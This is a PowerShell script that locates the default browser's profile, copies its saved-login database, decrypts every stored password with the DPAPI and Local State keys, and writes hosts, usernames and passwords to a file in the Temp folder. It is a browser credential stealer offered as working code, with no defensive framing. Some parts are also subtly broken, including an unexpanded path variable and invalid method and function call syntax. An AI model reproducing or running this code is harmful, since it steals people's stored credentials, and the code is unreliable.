$default_browser = (Get-ItemProperty 'HKCU:\Software\Microsoft\Windows\Shell\Associations\UrlAssociations\http\UserChoice').ProgId | ForEach-Object { (Get-ItemProperty "Registry::HKEY_CLASSES_ROOT\$_\shell\open\command").'(default)' -replace '"%1"','' -replace '"','' }
Import-Module -Name 'PSSQLite'
Add-Type -AssemblyName System.Security

$APP_DATA_PATH = [System.Environment]::GetFolderPath('LocalApplicationData')
$DB_PATH = 'Google\Chrome\User Data\Default\Login Data'

$NONCE_BYTE_SIZE = 12


#Univeral Browser stuff:

function Get-DefaultBrowserCommand {
    try {
        $progId = (Get-ItemProperty 'HKCU:\Software\Microsoft\Windows\Shell\Associations\UrlAssociations\http\UserChoice' -ErrorAction Stop).ProgId
        return (Get-ItemProperty "Registry::HKEY_CLASSES_ROOT\$progId\shell\open\command").'(default)'
    } catch {
        return $null
    }
}

function Resolve-BrowserUserDataPath {
    param([string]$browserCmd)

    if (-not $browserCmd) { return $null }

    $exePath = ($browserCmd -split '\s+')[0].Trim('"')
    $exeName = [System.IO.Path]::GetFileName($exePath).ToLower()
    $appParent = Split-Path $exePath -Parent

    switch ($exeName) {
        'chrome.exe'   { return Join-Path (Split-Path $appParent -Parent) 'User Data' }
        'msedge.exe'   { return Join-Path (Split-Path $appParent -Parent) 'User Data' }
        'brave.exe'    { return Join-Path (Split-Path $appParent -Parent) 'User Data' }
        'vivaldi.exe'  { return Join-Path (Split-Path $appParent -Parent) 'User Data' }
        'chromium.exe' { return Join-Path (Split-Path $appParent -Parent) 'User Data' }
        'opera.exe'    { return Join-Path $env:APPDATA 'Opera Software\Opera Stable' }
        'firefox.exe'  { return Join-Path $env:APPDATA 'Mozilla\Firefox\Profiles' }
        default        { return $null }
    }
}

$cmd = Get-DefaultBrowserCommand
if (-not $cmd) {
    Write-Host "Could not determine default browser."
    return
}

$userDataPath = Resolve-BrowserUserDataPath $cmd

$DB_PATH="$userDataPath\Default\Login Data"

function Encrypt($cipher, $plaintext, $nonce) {
    $cipher.Mode = [System.Security.Cryptography.CipherMode]::GCM
    $encryptor = $cipher.CreateEncryptor()
    $ciphertext = $encryptor.TransformFinalBlock($plaintext, 0, $plaintext.Length)
    return @($cipher, $ciphertext, $nonce)
}

function Decrypt($cipher, $ciphertext, $nonce) {
    $cipher.Mode = [System.Security.Cryptography.CipherMode]::GCM
    $decryptor = $cipher.CreateDecryptor()
    return $decryptor.TransformFinalBlock($ciphertext, 0, $ciphertext.Length)
}

function Get-Cipher($key) {
    $aes = New-Object System.Security.Cryptography.AesManaged
    $aes.Key = $key
    return $aes
}

function DPAPI-Decrypt($encrypted) {
    $blobin = New-Object System.Security.Cryptography.DataProtection.ProtectedData
    return [System.Security.Cryptography.ProtectedData]::Unprotect($encrypted, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
}

function Unix-Decrypt($encrypted) {
    if ($IsLinux) {
        $password = 'peanuts'
        $iterations = 1
    } else {
        throw "NotImplementedError"
    }

    $salt = 'saltysalt'
    $iv = ' ' * 16
    $length = 16
    $key = [System.Security.Cryptography.Rfc2898DeriveBytes]::new($password, [System.Text.Encoding]::UTF8.GetBytes($salt), $iterations).GetBytes($length)
    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aes.IV = [System.Text.Encoding]::UTF8.GetBytes($iv)
    $decryptor = $aes.CreateDecryptor($key, $aes.IV)
    $decrypted = $decryptor.TransformFinalBlock($encrypted[3..$encrypted.Length], 0, $encrypted.Length - 3)
    return $decrypted[0..($decrypted.Length - 1 - [System.Text.Encoding]::UTF8.GetBytes($decrypted[-1]))]
}

function Get-KeyFromLocalState {
    $path = Join-Path $APP_DATA_PATH '$userDataPath\Local State'
    $json = Get-Content -Path $path -Raw | ConvertFrom-Json
    return $json.os_crypt.encrypted_key
}

function Aes-Decrypt($encrypted_txt) {
    $encoded_key = Get-KeyFromLocalState
    $encrypted_key = [Convert]::FromBase64String($encoded_key)
    $encrypted_key = $encrypted_key[5..$encrypted_key.Length]
    $key = DPAPI-Decrypt($encrypted_key)
    $nonce = $encrypted_txt[3..15]
    $cipher = Get-Cipher($key)
    return Decrypt($cipher, $encrypted_txt[15..$encrypted_txt.Length], $nonce)
}

class password_man {
    [string[]]$PasswordList = @()

    [void] GetDataBase() {
        $full_path = Join-Path $APP_DATA_PATH $DB_PATH
        $temp_path = Join-Path $APP_DATA_PATH 'sqlite_file'
        if (Test-Path $temp_path) {
            Remove-Item $temp_path
        }
        Copy-Item -Path $full_path -Destination $temp_path
        $this.Show-Password($temp_path)
    }

    [void] Show-Password($db_file) {
        $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$db_file;Version=3;")
        $conn.Open()
        $sql = 'SELECT signon_realm, username_value, password_value FROM logins'
        $command = $conn.CreateCommand()
        $command.CommandText = $sql
        $reader = $command.ExecuteReader()
        while ($reader.Read()) {
            $host = $reader[0]
            if ($host.StartsWith('android')) {
                continue
            }
            $name = $reader[1]
            $value = $this.ChromeDecrypt($reader[2])
            $info = "Hostname: $host`nUsername: $name`nPassword: $value`n`n"
            $this.PasswordList += $info
        }
        $conn.Close()
        Remove-Item $db_file
    }

    [string] ChromeDecrypt($encrypted_txt) {
        if ($IsWindows) {
            try {
                if ($encrypted_txt[0..3] -eq [byte[]](0x01, 0x00, 0x00, 0x00)) {
                    $decrypted_txt = DPAPI-Decrypt($encrypted_txt)
                    return [System.Text.Encoding]::UTF8.GetString($decrypted_txt)
                } elseif ($encrypted_txt[0..2] -eq [byte[]](0x76, 0x31, 0x30)) {
                    $decrypted_txt = Aes-Decrypt($encrypted_txt)
                    return [System.Text.Encoding]::UTF8.GetString($decrypted_txt[0..($decrypted_txt.Length - 17)])
                }
            } catch {
                return $null
            }
        } else {
            try {
                return Unix-Decrypt($encrypted_txt)
            } catch {
                return $null
            }
        }
    }

    [void] SavePasswords() {
        $path = "$env:LOCALAPPDATA\Temp\pws.txt"
        $dir = Split-Path $path
        if (-not (Test-Path $dir)) {
            New-Item -ItemType Directory -Path $dir | Out-Null
        }
        $this.PasswordList | Out-File -FilePath $path -Encoding UTF8
    }

}

# Main execution
$main = [password_man]::new()
$main.GetDataBase()
$main.SavePasswords()
